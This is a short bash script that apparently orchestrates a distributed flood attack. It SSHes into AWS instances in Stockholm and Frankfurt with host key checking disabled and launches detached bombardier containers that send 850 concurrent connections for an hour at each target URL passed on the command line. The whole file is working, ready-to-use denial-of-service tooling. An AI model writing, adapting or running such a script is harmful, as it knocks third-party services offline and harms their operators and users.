#!/bin/bash

main(){
	local COLOR_GREEN=$'\e[1;32m'
	local RESET_COLOR=$'\e[0m'
	echo "${COLOR_GREEN}Firing via Bombardier...${RESET_COLOR}"
	./watchForInstancesStart.sh &&
	./watchForSSHStart.sh || exit 1

	fireFromStockholm ${@} &
	fireFromFrankfurt ${@} &
	wait
}

fireFromStockholm(){
	local STOCKHOLM_INSTANCES_IPS=`./getInstancesIPs.sh -s`

	for ip in ${STOCKHOLM_INSTANCES_IPS}
	do
		fire "key-stockholm-0.pem" ${ip} ${@} &
	done
	wait
}

fireFromFrankfurt(){
	local FRANKFURT_INSTANCES_IPS=`./getInstancesIPs.sh -f`

	for ip in ${FRANKFURT_INSTANCES_IPS}
	do
		fire "key-frankfurt-0.pem" ${ip} ${@} &
	done
	wait
}

fire(){
	local KEY=${1}
	local IP=${2}
	shift 2

	for target in ${@}
	do
		echo "    🔥 ${IP} » ${target}"
		ssh \
			-i ${KEY} \
			-o "LogLevel ERROR" \
			-o "IdentitiesOnly yes" \
			-o "StrictHostKeyChecking no" \
			-o "UserKnownHostsFile /dev/null" \
			"ubuntu@${IP}" \
				screen -dm \
					sudo docker run \
						-it \
						--rm alpine/bombardier \
						-c 850 \
						-d 3600s \
						-l ${target}
	done
}
./checkAWS.sh && main ${@} || ./awsCliNa.sh


